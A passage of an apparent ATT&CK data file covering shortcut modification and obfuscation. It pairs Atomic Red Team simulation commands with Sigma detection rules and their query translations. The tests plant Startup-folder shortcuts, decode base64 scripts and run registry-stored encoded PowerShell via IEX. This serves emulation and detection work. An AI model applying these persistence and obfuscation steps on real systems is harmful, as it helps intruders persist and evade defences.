"https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/backdoor_lnk", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/backdoor_lnk", "name": "Empire Module Command"}], "command_list": ["echo [InternetShortcut] > test.url && echo URL=C:\\windows\\system32\\calc.exe >> shortcutname.url && shortcutname.url >nul 2>&1\n", "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "powershell/persistence/userland/backdoor_lnk", "powershell/persistence/userland/backdoor_lnk"], "technique_id": "T1023", "parsed_datasets": [{"Atomic Red Team Test - Shortcut Modification": {"display_name": "Shortcut Modification", "atomic_tests": [{"description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL\n", "supported_platforms": ["windows"], "name": "Shortcut Modification", "input_arguments": {"shortcut_file_path": {"default": "shortcutname.url", "type": "path", "description": "shortcut modified and execute"}}, "executor": {"elevation_required": false, "command": "echo [InternetShortcut] > test.url && echo URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path} && #{shortcut_file_path} >nul 2>&1\n", "name": "command_prompt"}}, {"description": "LNK file to launch CMD placed in startup folder\n", "supported_platforms": ["windows"], "name": "Create shortcut to cmd in startup folders", "executor": {"elevation_required": true, "command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "name": "powershell", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\" -ErrorAction Ignore\n"}}], "attack_technique": "T1023"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1023", "Empire Module": "powershell/persistence/userland/backdoor_lnk", "Technique": "Shortcut Modification", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/backdoor_lnk\":  [\"T1023\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1027/T1027.yaml", "command": "sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\npowershell.exe -EncodedCommand $EncodedCommand\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "[a-z0-9]{1}.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.exe \\*.exe\\:Zone.Identifier:$DATA\" ", "name": null}], "command_list": ["sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\npowershell.exe -EncodedCommand $EncodedCommand\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "[a-z0-9]{1}.exe", "*.exe \\*.exe\\:Zone.Identifier:$DATA\" "], "technique_id": "T1027", "parsed_datasets": [{"Atomic Red Team Test - Obfuscated Files or Information": {"display_name": "Obfuscated Files or Information", "atomic_tests": [{"description": "Creates a base64-encoded data file and decodes it into an executable shell script\n", "supported_platforms": ["macos", "linux"], "name": "Decode base64 Data into Script", "executor": {"elevation_required": false, "command": "sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "name": "sh"}}, {"description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n", "supported_platforms": ["windows"], "name": "Execute base64-encoded PowerShell", "input_arguments": {"powershell_command": {"default": "Write-Host \"Hey, Atomic!\"", "type": "String", "description": "PowerShell command to encode"}}, "executor": {"elevation_required": false, "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\npowershell.exe -EncodedCommand $EncodedCommand\n", "name": "powershell"}}, {"description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n", "supported_platforms": ["windows"], "name": "Execute base64-encoded PowerShell from Windows Registry", "input_arguments": {"registry_entry_storage": {"default": "Debug", "type": "String", "description": "Windows Registry entry to store code under key"}, "powershell_command": {"default": "Write-Host \"Hey, Atomic!\"", "type": "String", "description": "PowerShell command to encode"}, "registry_key_storage": {"default": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion", "type": "String", "description": "Windows Registry Key to store code"}}, "executor": {"elevation_required": false, "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}"}}], "attack_technique": "T1027"}}, {"Threat Hunting Tables": {"mitre_attack": "T1027", "file_value": "", "file_path": "", "parent_process": "[a-z0-9]{1}.exe", "itw_sample": "3d77bf4f5d40aa7fff1c59058bf89e0349fa14e3260bbc290b836cbb1e1a17b7", "chain_id": "100001", "registry_value": "", "mitre_caption": "obfuscation", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1027", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "b3c4ae251f8094fa15b510051835c657eaef2a6cea46075d3aec964b14a99f68", "chain_id": "100123", "registry_value": "", "mitre_caption": "alternate_data_stream", "registry_path": "", "frequency": "low", "commandline_string": "\\*.exe\\:Zone.Identifier:$DATA\" ", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"certutil.exe\" and process_command_line contains \"encode\")or process_command_line contains \"ToBase64String\"", "product": "Azure Sentinel", "name": "Obfuscated Files Or Information"}, {"query": "title: Invoke-Obfuscation obfuscated IEX invocation\nid: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection_1:\n        EventID: 4104\n    selection_2:\n        - ScriptBlockText|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ScriptBlockText|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ScriptBlockText|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ScriptBlockText|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ScriptBlockText|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ScriptBlockText|re: '\\$VerbosePreference\\.ToString\\('\n        - ScriptBlockText|re: '\\String\\]\\s*\\$VerbosePreference'\n    selection_3:\n        EventID: 4103\n    selection_4:\n        - Payload|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - Payload|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - Payload|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - Payload|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - Payload|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - Payload|re: '\\$VerbosePreference\\.ToString\\('\n        - Payload|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: ( selection_1 and selection_2 ) or ( selection_3 and selection_4 )\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Invoke-Obfuscation obfuscated IEX invocation\nid: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    selection_1:\n        EventID: 4104\n    selection_2:\n        - ScriptBlockText|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ScriptBlockText|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ScriptBlockText|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ScriptBlockText|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ScriptBlockText|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ScriptBlockText|re: '\\$VerbosePreference\\.ToString\\('\n        - ScriptBlockText|re: '\\String\\]\\s*\\$VerbosePreference'\n    selection_3:\n        EventID: 4103\n    selection_4:\n        - Payload|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - Payload|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - Payload|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - Payload|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - Payload|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - Payload|re: '\\$VerbosePreference\\.ToString\\('\n        - Payload|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: ( selection_1 and selection_2 ) or ( selection_3 and selection_4 )\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4104\" AND (ScriptBlockText:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ScriptBlockText:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ScriptBlockText:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ScriptBlockText:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ScriptBlockText:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ScriptBlockText:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ScriptBlockText:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)) OR (EventID:\"4103\" AND (Payload:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR Payload:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR Payload:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR Payload:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR Payload:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR Payload:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR Payload:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invoke-Obfuscation-obfuscated-IEX-invocation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invoke-Obfuscation obfuscated IEX invocation\",\\n    \"description\": \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\\\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4104\\\\\" AND (ScriptBlockText:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ScriptBlockText:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ScriptBlockText:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ScriptBlockText:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)) OR (EventID:\\\\\"4103\\\\\" AND (Payload:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR Payload:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR Payload:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR Payload:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR Payload:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR Payload:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR Payload:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4104\\\\\" AND (ScriptBlockText:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ScriptBlockText:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ScriptBlockText:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ScriptBlockText:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ScriptBlockText:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)) OR (EventID:\\\\\"4103\\\\\" AND (Payload:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR Payload:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR Payload:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR Payload:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR Payload:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR Payload:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR Payload:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invoke-Obfuscation obfuscated IEX invocation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4104\" AND (ScriptBlockText:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ScriptBlockText:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ScriptBlockText:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ScriptBlockText:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ScriptBlockText:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ScriptBlockText:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ScriptBlockText:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)) OR (EventID:\"4103\" AND (Payload:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR Payload:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR Payload:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR Payload:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR Payload:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR Payload:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR Payload:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "title: Executable in ADS\nid: b69888d4-380c-45ce-9cf9-d9ce46e67821\nstatus: experimental\ndescription: Detects the creation of an ADS data stream that contains an executable (non-empty imphash)\nreferences:\n    - https://twitter.com/0xrawsec/status/1002478725605273600?s=21\ntags:\n    - attack.defense_evasion\n    - attack.t1027\n    - attack.s0139\nauthor: Florian Roth, @0xrawsec\ndate: 2018/06/03\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Requirements: Sysmon config with Imphash logging activated'\ndetection:\n    selection:\n        EventID: 15\n    filter:\n        Imphash: '00000000000000000000000000000000'\n    condition: selection and not filter\nfields:\n    - TargetFilename\n    - Image\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Executable in ADS\nid: b69888d4-380c-45ce-9cf9-d9ce46e67821\nstatus: experimental\ndescription: Detects the creation of an ADS data stream that contains an executable (non-empty imphash)\nreferences:\n    - https://twitter.com/0xrawsec/status/1002478725605273600?s=21\ntags:\n    - attack.defense_evasion\n    - attack.t1027\n    - attack.s0139\nauthor: Florian Roth, @0xrawsec\ndate: 2018/06/03\nlogsource:\n    product: windows\n    service: sysmon\n    definition: 'Requirements: Sysmon config with Imphash logging activated'\ndetection:\n    selection:\n        EventID: 15\n    filter:\n        Imphash: '00000000000000000000000000000000'\n    condition: selection and not filter\nfields:\n    - TargetFilename\n    - Image\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"15\" AND (NOT (Imphash:\"00000000000000000000000000000000\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Executable-in-ADS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Executable in ADS\",\\n    \"description\": \"Detects the creation of an ADS data stream that contains an executable (non-empty imphash)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\",\\n      \"attack.s0139\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"15\\\\\" AND (NOT (Imphash:\\\\\"00000000000000000000000000000000\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"15\\\\\" AND (NOT 